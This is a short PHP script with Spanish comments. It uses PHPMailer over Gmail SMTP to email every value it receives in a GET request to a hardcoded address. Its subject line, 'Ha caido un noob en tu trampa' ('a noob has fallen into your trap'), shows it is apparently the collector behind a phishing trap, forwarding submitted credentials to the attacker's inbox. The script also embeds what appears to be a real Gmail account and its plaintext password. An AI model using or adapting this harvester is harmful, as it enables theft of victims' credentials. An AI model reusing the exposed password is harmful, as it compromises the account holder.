<?php
require_once('class.phpmailer.php'); //Incluimos la clase phpmailer

$mail = new PHPMailer(true); // Declaramos un nuevo correo, el parametro true significa que mostrara excepciones y errores.

$mail->IsSMTP(); // Se especifica a la clase que se utilizará SMTP

//------------------------------------------------------
  $correo_emisor="2jota27@gmail.com";     //Correo a utilizar para autenticarse
  $nombre_emisor="rhodesian";               //Nombre de quien envía el correo
  $contrasena="salomon28-.,";          //contraseña de tu cuenta en Gmail
  $correo_destino="2jota27@gmail.com";      //Correo de quien recibe
  $nombre_destino="2Jotas";                //Nombre de quien recibe   	
//--------------------------------------------------------
  $mail->SMTPDebug  = 2;                     // Habilita información SMTP (opcional para pruebas)
                                             // 1 = errores y mensajes
                                             // 2 = solo mensajes
  $mail->SMTPAuth   = true;                  // Habilita la autenticación SMTP
  $mail->SMTPSecure = "ssl";                 // Establece el tipo de seguridad SMTP
  $mail->Host       = "smtp.gmail.com";      // Establece Gmail como el servidor SMTP
  $mail->Port       = 465;                   // Establece el puerto del servidor SMTP de Gmail
  $mail->Username   = $correo_emisor;  	     // Usuario Gmail
  $mail->Password   = $contrasena;           // Contraseña Gmail
  //A que dirección se puede responder el correo
  $mail->AddReplyTo($correo_emisor, $nombre_emisor);
  //La direccion a donde mandamos el correo
  $mail->AddAddress($correo_destino, $nombre_destino);
  //De parte de quien es el correo
  $mail->SetFrom($correo_emisor, $nombre_emisor);
  //Asunto del correo
  $mail->Subject = 'Ha caido un noob en tu trampa';
  
try{
  //Enviamos el correo
	foreach($_GET as $clave => $valor)
	{
		if(isset($clave))
		{
			$mail->MsgHTML($valor);
			$mail->Send();
		}
	
} 
  
} catch (phpmailerException $e) {
  	echo $e->errorMessage();
  	} //Errores de PhpMailer} 
  catch (Exception $e) {
  	echo $e->getMessage(); 
  	}//Errores de cualquier otra cosa.}

?>
